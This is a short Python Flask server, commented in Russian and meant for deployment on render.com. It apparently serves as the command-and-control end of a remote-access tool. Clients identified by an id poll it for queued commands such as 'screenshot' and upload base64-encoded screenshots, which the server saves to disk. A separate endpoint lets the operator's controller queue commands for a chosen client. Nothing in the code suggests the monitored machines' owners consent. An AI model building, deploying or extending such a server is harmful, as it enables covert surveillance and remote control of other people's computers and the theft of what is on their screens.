# server.py - для деплоя на render.com
from flask import Flask, request, jsonify
import base64
import os
from datetime import datetime

app = Flask(__name__)

# Хранилище: { client_id: {"cmd": "screenshot", "pending": True} }
pending_commands = {}
results = {}

@app.route('/api', methods=['GET'])
def get_command():
    client_id = request.args.get('id')
    if not client_id:
        return "no id", 400
    if client_id in pending_commands and pending_commands[client_id].get("pending"):
        cmd = pending_commands[client_id]["cmd"]
        pending_commands[client_id]["pending"] = False
        return cmd
    return ""

@app.route('/api/upload', methods=['POST'])
def upload():
    client_id = request.form.get('id')
    data = request.form.get('data')
    if client_id and data:
        # сохраняем скриншот или результат
        filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(data))
        return "ok"
    return "fail"

# Для твоего контроллера: отправка команды конкретному клиенту
@app.route('/api/send', methods=['POST'])
def send_command():
    client_id = request.json.get('id')
    command = request.json.get('cmd')
    if client_id and command:
        pending_commands[client_id] = {"cmd": command, "pending": True}
        return "ok"
    return "fail"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))